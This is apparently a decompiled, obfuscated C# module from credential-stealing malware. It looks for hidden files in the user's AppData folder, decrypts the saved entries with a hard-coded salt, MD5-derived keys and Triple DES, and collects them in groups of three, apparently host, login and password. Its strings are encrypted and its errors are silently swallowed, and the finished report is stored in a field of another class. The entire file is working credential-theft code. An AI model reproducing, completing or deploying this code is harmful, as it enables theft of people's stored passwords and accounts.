using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal class Class12
{
	public class Class13
	{
		public static byte[] byte_0 = new byte[11]
		{
			131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
			255
		};

		public static byte[] byte_1 = new byte[4] { 0, 0, 0, 8 };

		public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public static string string_1;

		public static int int_0 = 0;

		public static int int_1 = 0;

		public static int int_2 = 0;

		public static bool bool_0 = true;

		public static string string_2;

		public static string string_3;

		public static string string_4;

		public static string[] string_5 = new string[1001];

		public static string[] string_6 = new string[1001];

		public static string[] string_7 = new string[1001];

		public static int int_3 = 0;

		public static bool bool_1 = false;

		public static string[] string_8;

		public static string[] string_9 = new string[3001];

		public static string smethod_0()
		{
			List<string> list = new List<string>();
			string text = smethod_1();
			checked
			{
				try
				{
					string text2 = text;
					int i = 0;
					for (int length = text2.Length; i < length; i++)
					{
						string text3 = Conversions.ToString(text2[i]);
						if (Operators.CompareString(text3, "", false) != 0)
						{
							list.Add(text3);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				StringBuilder stringBuilder = new StringBuilder();
				string result = default(string);
				try
				{
					string text4;
					if (list.Count == 0)
					{
						text4 = Class6.smethod_0("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + Class6.smethod_0("P4ezr65+WKizsIWdtWqfjK2vrlyLp7dqnoJYta+fjK6ovKGBZGO5rj2sq69ckquovFyBoadqqoysY7Kdk51jmayCqqRqpYurt6uoiZ2neC0=", "False") + Environment.NewLine + Class6.smethod_0("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
						return result;
					}
					int num = list.Count - 1;
					for (int j = 0; j <= num; j += 3)
					{
						stringBuilder.Append(Class6.smethod_0("jM7d5Z1kAw==", "False") + list[j].Substring(1)).AppendLine();
						stringBuilder.Append(Class6.smethod_0("kcrH23uKuM/OlVwL", "False") + list[j + 1].Substring(1)).AppendLine();
						stringBuilder.Append(Class6.smethod_0("j7vY39WuzMmmfgc=", "False") + list[j + 2].Substring(1)).AppendLine();
						stringBuilder.Append(Class6.smethod_0("YXyHjoBhfIeOgGF8h46AYXyHjoBhfIeOgGF8h46AYXwk", "False")).AppendLine();
					}
					text4 = (Class5.string_8 = Class6.smethod_0("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + stringBuilder.ToString() + Environment.NewLine + Class6.smethod_0("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False"));
					return result;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static string smethod_1()
		{
			string result = default(string);
			try
			{
				if (File.Exists(string_0 + Class6.smethod_0("hZO/u7qKoJ7GrZulq82pl6h9uqmdHg==", "False")))
				{
					string_0 += Class6.smethod_0("coCsqKd3jYuzmoiSmLqWhJVqp5aKMQ==", "False");
					smethod_2();
					return result;
				}
				if (File.Exists(string_0 + Class6.smethod_0("f425tbSEmpjAp5WfpcC0kqSyvKd/taq+plGiqsQn", "False")))
				{
					string_0 += Class6.smethod_0("jZvHw8KSqKbOtaOts87CoLLAyrWNw7jMtF+wuNIZ", "False");
					smethod_2();
					return result;
				}
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static void smethod_2()
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(string_0);
					int num = 0;
					int num2 = array.Length - 5;
					for (int i = 0; i <= num2; i++)
					{
						if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
						{
							num = array[i + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num - 1 + 1];
							Array.Copy(array, i + 4, array2, 0, array2.Length);
							Array.Copy(array, i + 16, array3, 0, array3.Length);
							string_1 = string_1 + smethod_3(array2, array3) + Environment.NewLine;
							i += 11 + num;
						}
					}
					string_8 = string_1.Split(new char[1] { Conversions.ToChar(Environment.NewLine) });
					int num3 = 0;
					do
					{
						string_8[num3] = null;
						num3++;
					}
					while (num3 <= 3);
					int num4 = string_8.Length - 1;
					for (int j = 0; j <= num4; j++)
					{
						string_2 = null;
						string_3 = null;
						string_4 = null;
						int_0 = 0;
						if (!string_8[j].Contains(Class6.smethod_0("rtXg4591kAI=", "False")) && !string_8[j].Contains(Class6.smethod_0("kbjDxrtjc34g", "False")) && !string_8[j].Contains(Class6.smethod_0("lb7Fln1eGA==", "False")))
						{
							if (bool_1)
							{
								if (j - int_3 == 1 || j - int_3 == 2)
								{
									int num5 = string_8[j].Length - 1;
									for (int k = 0; k <= num5; k++)
									{
										if (string_8[j][k - int_0] > '\u007f')
										{
											string_8[j] = string_8[j].Remove(k - int_0, 1);
											int_0++;
										}
									}
									if (j - int_3 == 1)
									{
										string_3 = string_8[j];
									}
									else if (j - int_3 == 2)
									{
										string_4 = string_8[j];
										int_1++;
										bool_1 = false;
									}
								}
							}
							else if (int_3 != 0 && (j == int_3 + 2 || j == int_3 + 4))
							{
								int num6 = string_8[j].Length - 1;
								for (int l = 0; l <= num6; l++)
								{
									if (string_8[j][l - int_0] > '\u007f')
									{
										string_8[j] = string_8[j].Remove(l - int_0, 1);
										int_0++;
									}
								}
								if (j == int_3 + 2)
								{
									string_3 = string_8[j];
								}
								else if (j == int_3 + 4)
								{
									string_4 = string_8[j];
									int_1++;
								}
							}
						}
						else if (j != 0)
						{
							int num7 = string_8[j].Length - 1;
							for (int m = 0; m <= num7; m++)
							{
								if (string_8[j][m - int_0] > '\u007f')
								{
									string_8[j] = string_8[j].Remove(m - int_0, 1);
									int_0++;
								}
							}
							if (j - int_3 == 1)
							{
								string_2 = string_8[j];
							}
							else if (j - int_3 == 2)
							{
								string_2 = string_8[j];
							}
							if (string_8[j].Contains(Class6.smethod_0("lb7Fln1eGA==", "False")))
							{
								string_2 = string_8[j];
							}
							int_3 = j;
						}
						if (Operators.CompareString(string_2, (string)null, false) != 0)
						{
							string_5[int_1] = string_2;
						}
						if (Operators.CompareString(string_3, (string)null, false) != 0)
						{
							string_6[int_1] = string_3;
						}
						if (Operators.CompareString(string_4, (string)null, false) != 0)
						{
							string_7[int_1 - 1] = string_4;
						}
					}
					int num8 = string_5.Length - 1;
					for (int n = 0; n <= num8 && Operators.CompareString(string_5[n], "", false) != 0; n++)
					{
						string_9[int_2] = string_5[n];
						string_9[int_2 + 1] = string_6[n];
						string_9[int_2 + 2] = string_7[n];
						int_2 += 3;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string smethod_3(byte[] byte_2, byte[] byte_3)
		{
			checked
			{
				try
				{
					MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
					mD5CryptoServiceProvider.Initialize();
					byte[] array = new byte[byte_0.Length + (byte_2.Length - 1) + 1];
					Array.Copy(byte_0, array, byte_0.Length);
					Array.Copy(byte_2, 0, array, byte_0.Length, byte_2.Length);
					byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
					array = new byte[array2.Length + byte_0.Length + (byte_2.Length - 1) + 1];
					Array.Copy(array2, array, array2.Length);
					Array.Copy(byte_0, 0, array, array2.Length, byte_0.Length);
					Array.Copy(byte_2, 0, array, array2.Length + byte_0.Length, byte_2.Length);
					byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
					byte[] array3 = new byte[24];
					byte[] array4 = new byte[8];
					Array.Copy(array2, array3, array2.Length);
					Array.Copy(sourceArray, 0, array3, array2.Length, 8);
					Array.Copy(sourceArray, 8, array4, 0, 8);
					byte_2 = array3;
					tripleDESCryptoServiceProvider.IV = array4;
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					byte[] bytes = cryptoTransform.TransformFinalBlock(byte_3, 0, byte_3.Length);
					return Encoding.Unicode.GetString(bytes);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string result = "";
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}
}
